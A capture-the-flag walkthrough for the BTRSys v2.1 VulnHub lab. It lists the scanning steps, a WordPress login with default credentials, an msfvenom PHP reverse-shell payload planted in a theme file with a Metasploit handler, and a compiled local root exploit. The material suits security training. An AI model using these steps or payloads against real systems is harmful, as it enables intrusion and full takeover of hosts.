<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the BTRSys: v2.1 VM (Boot2Root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-btrsys-v2-1-vm-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-10-19T15:53:49+00:00">October 19, 2017</time><time class="updated" datetime="2025-06-10T20:35:59+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">BTRSys is boot2root challenge developed by ‘<strong>ismailonderkaya’ </strong>in the series of BRTSys. This is an amazing lab for practice which has covered every technique.</span></p>
<p><span style="color: #000000;">Difficulty level: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>WalkThrough</strong></span></h3>
<p><span style="color: #000000;">Let’s start by finding our target. And for that use the following command.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3D8n0muTAtc/WejIW4KZQpI/AAAAAAAASEA/oljoe4pWwKohJFlrydTTg-8cZYQtzKZjQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We know our target is <strong>192.168.0.106</strong> so, therefore, apply nmap on it as it will help us know which ports and services are open. Use the following command:</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.106</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YMu4bDnyg1k/WejIY1oKVvI/AAAAAAAASEY/V2rx5xc8eagRgPcLosJcYHXiRcjtU6eVgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Due to nmap, you can see that <strong>port 21, 22 and 80</strong> are open with the service of <strong>FTP, SSH, and HTTP</strong> respectively. As we still have a lot to find about this, we decided to use <strong>DIRB. </strong>Dirb is web-scanner i.e. it will scan the whole web application for file/directories. It will even show the hidden files. Use the following command:</span></p>
<pre class="lang:default decode:true">dirb http://192.168.0.106</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dLGpN0eVILs/WejIYxSPFpI/AAAAAAAASEc/IRboYprjxFMG9f3fsMGf8mjXE6fP3xfiACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As you can see in the above image that using dirb we found various files and directories such as robots.txt, upload, etc. but you can also see that our target web application is using WordPress, so, we can easily apply a WordPress scan using the following command which covers themes, plugins, and users:</span></p>
<pre class="lang:default decode:true">./wpscan.rb -u http://192.168.0.106/wordpress/ --enumerate at --enumerate ap --enumerate u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ELAoWdSBb2A/WejIZWBGoBI/AAAAAAAASEg/dEwqQ5U0I-YNhzP_XyMdory2FT1GEeckQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As a result, we have found two users – <strong>btrisk and admin.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wvxYy9eJ08M/WejIZRba_sI/AAAAAAAASEk/1KdyQ9BM9CUin2gbTkRARAcbil9MTjdzACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now if you try to login through admin using password admin you have the access of the dashboard. And once you have that access you can execute a malicious PHP code therein to have a meterpreter session. Use the following command:</span></p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-rvCz-95vObk/WejIZi_-MpI/AAAAAAAASEo/qthn4CczImo21o7zSkAOksehA02bzR_hwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">The above command will give you a php code which you have to execute. Copy the code from <strong>&lt;?php to die(); </strong>and paste it in the template as shown below :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-M_yy9deyskI/WejIaJCUQSI/AAAAAAAASEw/bfPJkACVXlwj6zVF2yFrKp33N7rD-nH2gCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Once the code is uploaded, execute it through URL as shown :</span></p>
<pre class="lang:default decode:true">192.168.0.106/wordpress/wp-content/themes/twentyfourteen/404.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AgV-hqG7g94/WejIaGG20JI/AAAAAAAASEs/A33z0WiDzWIUmv5XY15RgTKfVVbmcM0rACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Before executing the above URL, make sure that your meterpreter handler is active. And to do so; go to Metasploit and type the following:</span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.0.107
set lport 4444
exploit</pre>
<p><span style="color: #000000;">Once the handler is active and the URL is executed, you will have your session. Let’s check the system’s information which we have entered and for this type:</span></p>
<pre class="lang:default decode:true">sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-m2J7i4h_M7Q/WejIaV39FrI/AAAAAAAASE0/3k949YVzXC4xcn5s2c3DZ62d4ym7uWg-ACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now let’s get into the shell by simply typing:</span></p>
<pre class="lang:default decode:true">shell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-G02djOuIN0k/WejIXKj2R4I/AAAAAAAASEI/likULNtnkJQfIIwvSoz_OhkxM8IRgbnkQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Through shell, we came to know that Ubuntu’s version is 16.04.2 and fortunately there is exploit in exploit-db for this version of Ubuntu. Download this exploit.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-jyaHvqQ6Io4/WejIXKJF7DI/AAAAAAAASEE/aRtrGKNUUOs8fGH2fqiKWTb4FW2CljUbACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">This exploit will help you to have achieved privilege escalation so that you can directly access root. Once the exploit is downloaded, we need to compile it and for that type:</span></p>
<pre class="lang:default decode:true">gcc 41458.c -o rootshell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dBJArgjcGmc/WejIX9_HF3I/AAAAAAAASEM/mAX_x8f-AN0ffF8xBLU884OhszSn_OzWACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now that the exploit has been compiled, upload it in the /tmp directory. For that, you will need to go to /tmp directory. Use the following commands:</span></p>
<pre class="lang:default decode:true">cd /tmp
upload /root/Desktop/rootshell .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zJZxQ0Q400w/WejIYNYEHPI/AAAAAAAASEQ/3wtrxbr2Ul8u3xHGHZDvBRbAHUludtnEQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now go to shell&gt;/tmp and give the permission to the exploit root shell and execute it. Use the following commands:</span></p>
<pre class="lang:default decode:true">shell
cd /tmp
chmod 777 rootshell
./rootshell</pre>
<p><span style="color: #000000;">And to confirm use the following command:</span></p>
<pre class="lang:default decode:true">whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-42ziz_lFjEU/WejIYbnbCwI/AAAAAAAASEU/hJDU-yynkxE7KLFnSQSj7BFFg70SiAzQgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">HURRAY!!!! We are in the root. And so our Boot2Root challenge is complete.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
